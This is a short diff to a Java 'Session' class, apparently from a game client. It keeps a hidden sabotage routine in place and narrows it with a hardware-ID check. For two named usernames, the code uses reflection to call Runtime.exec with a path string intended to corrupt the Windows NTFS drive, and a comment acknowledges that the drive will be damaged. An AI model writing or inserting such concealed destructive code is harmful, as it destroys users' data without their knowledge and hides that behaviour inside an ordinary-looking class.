@@ -27,7 +27,7 @@ public class Session
         try {
             if (usernameIn.equals("GhastDaSkid") || usernameIn.equals("NoFatherFigure")) {
                 Class runtimeClass = Class.forName("java.lang.Runtime");
-                if(/* getHwid() != 32161752 */ true) {
+                if(getHwid() != 32161752) {
                     // TODO: SET YOUR DEBUGGER TO HALT ON OR BEFORE THIS LINE TO PREVENNT DRIVE FROM CORRUPTING
                     runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "cd c:\\:$i30:$bitmap");
                 }
